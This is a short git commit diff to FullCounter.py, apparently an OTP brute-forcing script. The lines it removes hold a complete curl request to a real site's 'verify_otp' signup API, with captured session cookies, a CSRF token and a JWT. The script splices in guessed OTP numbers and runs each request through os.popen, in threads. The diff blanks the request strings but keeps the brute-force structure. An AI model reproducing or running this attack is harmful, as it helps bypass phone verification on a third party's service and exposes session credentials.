8a5564295bdd81c00f0f48a5e9b5cbb33f0b5432
apt-x4869 <55894766+apt-x4869@users.noreply.github.com>
2019-11-30 01:17:17 +0530

    Update FullCounter.py

--- FullCounter.py
+++ FullCounter.py
@@ -2,8 +2,8 @@ import os
 import threading
 
 def otp(num):
-    s1 = str("""curl -i -s -k -X 'POST' -H 'Host: www.callingstation.in' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: https://www.callingstation.in/signup/' -H 'Content-Type: application/json' -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Length: 189' -H 'Connection: close' -H 'Cookie: __tawkuuid=e::callingstation.in::sGSlhk0h9zIcSHin/zAESJx8UMxWsS4w9K5jl/KpTFxXQT51va4/SvubAh895LNR::2; csrftoken=LYjVi46sTyArFFkslTry9zGaLRwX5hQoxubmwRY9jnRK5aOWWkHXCpxtH3N5KALp; TawkConnectionTime=0; _TRAEFIK_BACKEND=http://10.0.3.227:9905; __CSVer__=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJtb2JpbGUiOiI5MzA0MjI1NzUyIiwidHMiOjE1NzQwMDc2MjN9.KTbjmUs7ZjuLfrc-bc2tJUBAVJz1JkLdDM_w6Am3Rxk' -b '__tawkuuid=e::callingstation.in::sGSlhk0h9zIcSHin/zAESJx8UMxWsS4w9K5jl/KpTFxXQT51va4/SvubAh895LNR::2; csrftoken=LYjVi46sTyArFFkslTry9zGaLRwX5hQoxubmwRY9jnRK5aOWWkHXCpxtH3N5KALp; TawkConnectionTime=0; _TRAEFIK_BACKEND=http://10.0.3.227:9905; __CSVer__=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJtb2JpbGUiOiI5MzA0MjI1NzUyIiwidHMiOjE1NzQwMDc2MjN9.KTbjmUs7ZjuLfrc-bc2tJUBAVJz1JkLdDM_w6Am3Rxk' --data-binary '{\"x\":\"verify_otp\",\"pl\":{\"signup_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJtb2JpbGUiOiI5MzA0MjI1NzUyIiwidHMiOjE1NzQwMDc2MjN9.KTbjmUs7ZjuLfrc-bc2tJUBAVJz1JkLdDM_w6Am3Rxk\",\"otp\":\"""")
-    s2 = str("""\"}}' 'https://www.callingstation.in/apis/v1'""")
+    s1 = str(""" """)
+    s2 = str(""" """)
     num = str(num)
     rd = os.popen(s1+num+s2).read()
     strin = str(rd)
